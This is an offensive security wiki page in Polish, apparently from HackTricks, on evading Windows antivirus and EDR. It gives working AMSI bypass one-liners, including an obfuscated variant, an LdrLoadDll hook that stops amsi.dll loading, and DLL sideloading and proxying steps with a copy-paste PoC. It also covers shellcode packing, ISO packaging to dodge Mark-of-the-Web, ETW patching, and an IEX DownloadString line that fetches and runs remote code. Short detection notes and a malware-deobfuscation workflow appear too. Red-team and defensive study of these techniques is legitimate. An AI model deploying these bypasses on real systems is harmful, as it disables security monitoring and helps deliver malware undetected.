# Omijanie antywirusa (AV)

{{#include ../banners/hacktricks-training.md}}

**Stronę napisał** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymaj Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender, podszywając się pod inny AV.
- [Wyłącz Defender, jeśli masz uprawnienia administratora](basic-powershell-for-pentesters/README.md)

## **Metodologia omijania AV**

Obecnie AV wykorzystują różne metody sprawdzania, czy plik jest złośliwy, czy nie: wykrywanie statyczne, analiza dynamiczna, a w przypadku bardziej zaawansowanych EDR — analiza behawioralna.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych łańcuchów znaków lub sekwencji bajtów w binarium lub skrypcie, a także na wyciąganiu informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itd.). Oznacza to, że używanie znanych publicznych narzędzi może prowadzić do szybszego wykrycia, ponieważ prawdopodobnie zostały przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia takiego wykrywania:

- **Szyfrowanie**

Jeśli zaszyfrujesz binarium, AV nie będzie w stanie wykryć programu, ale będziesz potrzebował jakiegoś loadera, by odszyfrować i uruchomić program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka łańcuchów w binarium lub skrypcie, żeby przejść obok AV, ale może to być czasochłonne w zależności od tego, co próbujesz obfuskować.

- **Narzędzia własne**

Jeśli opracujesz własne narzędzia, nie będzie znanych sygnatur, ale to wymaga dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzenia wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów, a następnie każe Defenderowi przeskanować każdy z nich osobno — w ten sposób może dokładnie wskazać, które łańcuchy lub bajty w binarium są oznaczone.

Gorąco polecam sprawdzenie tej [playlisty na YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym omijaniu AV.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu binarium przez AV w piaskownicy i obserwowaniu złośliwej aktywności (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidumpa na LSASS itd.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, by ominąć piaskownice.

- **Uśpienie przed wykonaniem** W zależności od implementacji może to być świetny sposób na ominięcie analizy dynamicznej AV. AV ma bardzo mało czasu na skanowanie plików, by nie przerywać pracy użytkownika, więc stosowanie długich sleepów może zaburzyć analizę binariów. Problem w tym, że wiele piaskownic AV może po prostu pominąć sleep, w zależności od tego, jak to zostało zaimplementowane.
- **Sprawdzanie zasobów maszyny** Zazwyczaj piaskownice mają bardzo mało zasobów do wykorzystania (np. < 2GB RAM), inaczej mogłyby spowolnić maszynę użytkownika. Możesz też być tu bardzo kreatywny — np. sprawdzając temperaturę CPU czy prędkości wentylatorów; nie wszystko będzie zaimplementowane w piaskownicy.
- **Sprawdzenia specyficzne dla maszyny** Jeśli chcesz targetować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera i zweryfikować, czy pasuje do tej, którą podałeś — jeśli nie, możesz zakończyć działanie programu.

Okazuje się, że nazwa komputera w Sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa pasuje do HAL9TH, oznacza to, że jesteś w piaskownicy Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych świetnych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących radzenia sobie z piaskownicami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanał #malware-dev</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej, **publiczne narzędzia** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? Albo czy możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie to drugie. Biorąc mimikatz jako przykład — to prawdopodobnie jedno z, jeśli nie najbardziej oznaczonych narzędzi przez AV i EDR; choć projekt jest super, to praca z nim w kontekście omijania AV jest koszmarem, więc po prostu poszukaj alternatyw do osiągnięcia tego, co chcesz.

> [!TIP]
> Podczas modyfikowania payloadów pod kątem unikania wykrycia, upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w Defenderze i poważnie — **NIE WYSYŁAJ NA VIRUSTOTAL**, jeśli Twoim celem jest długoterminowe ominięcie wykrycia. Jeśli chcesz sprawdzić, czy Twój payload jest wykrywany przez konkretne AV, zainstaluj je na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z rezultatu.

## EXE vs DLL

Gdy to możliwe, zawsze **priorytetowo używaj DLL do omijania wykrycia** — z mojego doświadczenia, pliki DLL są zazwyczaj **znacznie mniej wykrywane** i analizowane, więc to prosty trik, który w niektórych przypadkach pozwala uniknąć detekcji (oczywiście jeśli Twój payload ma możliwość uruchomienia jako DLL).

Jak widać na tym obrazie, DLL Payload z Havoc ma współczynnik wykrycia 4/26 na antiscan.me, podczas gdy EXE ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>porównanie na antiscan.me normalnego payloadu Havoc EXE vs zwykłego Havoc DLL</p></figcaption></figure>

Poniżej pokażemy kilka trików, które możesz zastosować z plikami DLL, aby być znacznie bardziej ukrytym.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, ustawiając aplikację ofiary i złośliwy payload(y) obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) i następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco zalecam, abyś **samodzielnie zbadał programy DLL Hijackable/Sideloadable** — ta technika jest dość trudna do wykrycia, jeśli jest wykonana poprawnie, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo wykryty.

Samo umieszczenie złośliwej biblioteki DLL o nazwie, którą program oczekuje załadować, nie spowoduje uruchomienia twojego payloadu, ponieważ program oczekuje konkretnych funkcji w tej bibliotece. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje z proxy (i złośliwej) biblioteki DLL do oryginalnej biblioteki DLL, zachowując w ten sposób funkcjonalność programu i umożliwiając wykonanie twojego payloadu.

Będę korzystał z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie wygeneruje 2 pliki: szablon kodu źródłowego DLL oraz oryginalny, przemianowany plik DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wskaźnik wykrycia 0/26 na [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Zdecydowanie **polecam** obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz także [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy bardziej szczegółowo.

### Wykorzystywanie przekierowanych eksportów (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są właściwie "forwarderami": zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w formacie `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader Windows wykona:

- Załaduje `TargetDll`, jeśli nie jest już załadowany
- Rozwiąże `TargetFunc` z niego

Kluczowe zachowania do zrozumienia:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, używany jest normalny porządek wyszukiwania DLL, który obejmuje katalog modułu wykonującego rozwiązywanie przekierowania.

To umożliwia pośrednią prymitywę sideloading: znajdź podpisany DLL, który eksportuje funkcję przekierowaną do modułu o nazwie niebędącej KnownDLL, a następnie umieść ten podpisany DLL razem z kontrolowanym przez atakującego DLL o dokładnie takiej samej nazwie jak przekierowany moduł docelowy. Gdy wywołany zostanie przekierowany eksport, loader rozwiąże przekierowanie i załaduje twój DLL z tego samego katalogu, wykonując twoje DllMain.

Przykład zaobserwowany na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany zgodnie z normalną kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Wystarczy umieścić złośliwy plik `NCRYPTPROV.dll` w tym samym folderze. Wystarczy minimalny DllMain, aby uzyskać wykonanie kodu; nie musisz implementować przekierowanej (forwarded) funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Zaobserwowane zachowanie:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface` loader podąża za przekierowaniem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowany, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykonał

Hunting tips:
- Skup się na forwarded exports, gdzie docelowy moduł nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyenumerować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z nie-systemowych ścieżek, a następnie ładujące nie-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Wysyłaj alerty na łańcuchy procesów/modułów takie jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuszaj polityki integralności kodu (WDAC/AppLocker) i zabroń write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Unikanie wykrycia to gra w kotka i myszkę — to, co działa dziś, może zostać wykryte jutro. Nie polegaj wyłącznie na jednym narzędziu; jeśli to możliwe, staraj się łączyć kilka technik unikania wykrycia.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "fileless malware". Początkowo AV potrafiły skanować tylko pliki na dysku, więc jeśli udało się w jakiś sposób wykonać payloady bezpośrednio in-memory, AV nie mogły nic zrobić, ponieważ nie miały wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows:

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala to rozwiązaniom antywirusowym na analizę zachowania skryptów przez udostępnienie ich treści w formie niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a następnie ścieżka do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci in-memory z powodu AMSI.

Co więcej, począwszy od .NET 4.8, kod C# również przechodzi przez AMSI. Nawet `Assembly.Load(byte[])` do ładowania in-memory jest objęte skanowaniem. Dlatego zaleca się używanie niższych wersji .NET (np. 4.7.2 lub starszych) do wykonywania in-memory, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

  Ponieważ AMSI działa głównie w oparciu o wykrycia statyczne, modyfikowanie skryptów, które próbujesz załadować, może być dobrą metodą uniknięcia wykrycia.

  Jednak AMSI potrafi deobfuskować skrypty nawet przy wielowarstwowej obfuskacji, więc obfuskacja może być nieskuteczna w zależności od sposobu jej wykonania. To sprawia, że obejście nie jest proste. Czasami wystarczy jednak zmienić kilka nazw zmiennych i sprawa jest załatwiona — wszystko zależy od poziomu oznaczeń.

- **AMSI Bypass**

  Ponieważ AMSI jest zaimplementowany przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itp.), możliwe jest łatwe manipulowanie nim nawet przy uruchomieniu jako użytkownik bez uprawnień administratora. Z powodu tej luki w implementacji AMSI badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie błędu inicjalizacji AMSI (amsiInitFailed) skutkuje tym, że żadne skanowanie nie zostanie uruchomione dla bieżącego procesu. Początkowo ujawnił to [Matt Graeber](https://twitter.com/mattifestation) i Microsoft opracował sygnaturę, aby ograniczyć szersze wykorzystanie tej metody.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc potrzebna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie wykryte po opublikowaniu tego posta, więc nie publikuj żadnego kodu, jeśli chcesz pozostać niewykryty.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych podanych przez użytkownika) i nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG — w ten sposób wynik rzeczywistego skanu zwróci 0, co jest interpretowane jako wynik bez wykryć.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) aby uzyskać bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik używanych do obejścia AMSI z użyciem powershell — zobacz [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) oraz [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się więcej na ich temat.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI jest inicjalizowany dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidne, niezależne od języka obejście polega na umieszczeniu hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądany moduł to `amsi.dll`. W rezultacie AMSI nigdy się nie załaduje i w tym procesie nie nastąpią żadne skany.

Zarys implementacji (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa zarówno w PowerShell, WScript/CScript, jak i w custom loaders (wszystko, co w innym przypadku załadowałoby AMSI).
- Stosuj razem z przekazywaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w wierszu poleceń.
- Obserwowane użycie przez loaders uruchamiane poprzez LOLBins (np. `regsvr32` wywołujący `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** oraz **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie skanuje pamięć bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR używające AMSI**

Listę produktów AV/EDR używających AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell wersji 2**
Jeśli używasz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja, która pozwala rejestrować wszystkie komendy PowerShell wykonywane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą unikać wykrycia**.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) w tym celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell version 2, AMSI nie zostanie załadowane, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell pozbawiony zabezpieczeń (to jest to, czego używa `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię binary, a to z kolei ułatwia AVs i EDRs ich wykrycie. Bądź ostrożny z tym i rozważ stosowanie szyfrowania tylko do konkretnych sekcji kodu, które są wrażliwe lub muszą być ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Analizując malware używające ConfuserEx 2 (lub komercyjnych forków), często napotykasz na kilka warstw ochrony, które zablokują dekompilery i sandboksy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który następnie można zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Anti-tampering removal – ConfuserEx szyfruje każde *method body* i odszyfrowuje je wewnątrz statycznego konstruktora *module* (`<Module>.cctor`). To również modyfikuje sumę kontrolną PE, więc jakakolwiek modyfikacja spowoduje awarię binary. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i zapisać czyste assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być użyteczne przy tworzeniu własnego unpackera.

2.  Symbol / control-flow recovery – podaj *clean* plik do **de4dot-cex** (fork de4dot z obsługą ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybierz profil ConfuserEx 2  
• de4dot cofa control-flow flattening, przywraca oryginalne przestrzenie nazw, klasy i nazwy zmiennych oraz odszyfrowuje stałe łańcuchy.

3.  Proxy-call stripping – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne .NET API takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieprzejrzystych funkcji wrapper (`Class8.smethod_10`, …).

4.  Manual clean-up – uruchom otrzymany binary pod dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako TLV-enkodowaną tablicę bajtów zainicjalizowaną w `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** potrzeby uruchamiania złośliwej próbki — przydatne podczas pracy na stacji roboczej offline.

> 🛈  ConfuserEx generuje niestandardowy atrybut o nazwie `ConfusedByAttribute`, który może być użyty jako IOC do automatycznego triage'u próbek.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie open-source forka [LLVM](http://www.llvm.org/) compilation suite, umożliwiającego zwiększenie bezpieczeństwa oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania w czasie kompilacji obfuscated code bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez C++ template metaprogramming framework, co nieco utrudni życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz jest x64 binary obfuscator, który potrafi obfuscate różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuscates program na poziomie kodu assembly przez przekształcanie zwykłych instrukcji w ROP chains, podważając naturalne rozumienie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi konwertować istniejące EXE/DLL do shellcode, a następnie je załadować

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne: Należy pamiętać, że pliki wykonywalne podpisane za pomocą zaufanego certyfikatu podpisu **nie wywołają SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is a powerful logging mechanism in Windows that allows applications and system components to **log events**. However, it can also be used by security products to monitor and detect malicious activities.

Podobnie jak w przypadku obchodzenia AMSI, możliwe jest także sprawienie, by funkcja użytkownika przestrzeni `EtwEventWrite` zwracała natychmiast bez logowania jakichkolwiek zdarzeń. Robi się to przez załatanie funkcji w pamięci tak, aby od razu zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

